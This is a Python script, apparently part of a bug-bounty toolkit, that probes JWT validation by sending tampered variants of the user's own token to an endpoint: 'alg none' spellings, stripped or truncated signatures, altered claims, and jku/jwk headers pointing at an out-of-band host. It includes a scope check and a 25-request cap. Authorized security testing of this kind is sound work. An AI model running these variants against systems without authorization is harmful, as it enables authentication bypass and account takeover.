#!/usr/bin/env python3
"""JWT variant probe for your own token (bounded: capped at 25 requests).

Takes one valid token you own and sends unsigned or tampered variants to one
endpoint on your own account: alg none spellings, empty signature, truncated
signature, claim changes (exp in the past, nbf and iat in the future, aud and iss
changed), and a jku/jwk header pointing at your out-of-band host. Expected result for every
variant is a rejection. Acceptance of a variant is a finding. No signing key is
needed or used. Scope gate runs first.

Example:
  jwt_variant_probe.py --target example.com --workspace ~/Documents/bugbounty \
     --url https://example.com/api/me --token-file ~/tmp/my_token.txt --oob-host abc.oast.example
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request

REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", ".."))
SCOPE = os.path.join(REPO, "scripts", "scope_check.sh")
MAX_REQUESTS = 25


def b64d(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64e(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def split(tok: str) -> tuple[dict, dict, str]:
    h, p, s = tok.split(".")
    return json.loads(b64d(h)), json.loads(b64d(p)), s


def build(header: dict, payload: dict, sig: str) -> str:
    return f"{b64e(json.dumps(header, separators=(',', ':')).encode())}.{b64e(json.dumps(payload, separators=(',', ':')).encode())}.{sig}"


def send(url: str, header_name: str, token: str, timeout: float) -> int:
    req = urllib.request.Request(url, headers={header_name: f"Bearer {token}" if header_name.lower() == "authorization" else token})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ssl.create_default_context()) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except (urllib.error.URLError, OSError):
        return 0


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--workspace")
    ap.add_argument("--url", required=True, help="endpoint that requires the token (your own account)")
    ap.add_argument("--token-file", required=True, help="file containing your own valid JWT")
    ap.add_argument("--header", default="Authorization", help="header carrying the token")
    ap.add_argument("--oob-host", help="host you control for jku/jwk variant")
    ap.add_argument("--delay", type=float, default=1.0)
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--out")
    args = ap.parse_args()

    res = subprocess.run([SCOPE, args.target] + ([args.workspace] if args.workspace else []),
                         capture_output=True, text=True)
    if res.returncode != 0:
        sys.stderr.write(res.stderr or "scope check failed\n")
        return res.returncode

    token = open(args.token_file, encoding="utf-8").read().strip()
    header, payload, sig = split(token)
    now = int(time.time())
    baseline = send(args.url, args.header, token, args.timeout)

    variants: list[tuple[str, str]] = []
    for alg in ("none", "None", "NONE"):
        variants.append((f"alg {alg}, empty signature", build({**header, "alg": alg}, payload, "")))
    variants.append(("empty signature", build(header, payload, "")))
    variants.append(("truncated signature", build(header, payload, sig[: max(1, len(sig) // 2)])))
    variants.append(("exp in the past (signature kept)", build(header, {**payload, "exp": now - 3600}, sig)))
    variants.append(("nbf in the future (signature kept)", build(header, {**payload, "nbf": now + 3600}, sig)))
    variants.append(("iat in the future (signature kept)", build(header, {**payload, "iat": now + 3600}, sig)))
    variants.append(("aud changed (signature kept)", build(header, {**payload, "aud": "other-audience"}, sig)))
    variants.append(("iss changed (signature kept)", build(header, {**payload, "iss": "https://other-issuer.invalid"}, sig)))
    if args.oob_host:
        variants.append(("jku to own host (signature kept)", build({**header, "jku": f"https://{args.oob_host}/jwks.json"}, payload, sig)))
        variants.append(("jwk header to own host (signature kept)", build({**header, "jwk": {"kty": "oct", "k": "AA"}}, payload, sig)))

    results = [{"variant": "baseline (original token)", "status": baseline, "expected": "accept"}]
    sent = 1
    for name, tok in variants:
        if sent >= MAX_REQUESTS: break
        code = send(args.url, args.header, tok, args.timeout); sent += 1
        accepted = code in (200, 201, 204)
        results.append({"variant": name, "status": code, "accepted": accepted,
                        "finding": accepted and baseline in (200, 201, 204)})
        time.sleep(args.delay)

    # Replay: the same original token twice (jti replay is only meaningful if the app marks tokens used)
    if sent < MAX_REQUESTS:
        code = send(args.url, args.header, token, args.timeout); sent += 1
        results.append({"variant": "replay of original token", "status": code, "note": "compare with logout behaviour"})

    report = {"url": args.url, "requests_sent": sent, "baseline_status": baseline,
              "findings": [r["variant"] for r in results if r.get("finding")], "results": results,
              "next_step": "Any accepted variant is a finding. Confirm with a second account and report the header and claim changes."}
    text = json.dumps(report, indent=2)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as fh:
            fh.write(text + "\n")
    print(text)
    return 0


if __name__ == "__main__":
    sys.exit(main())
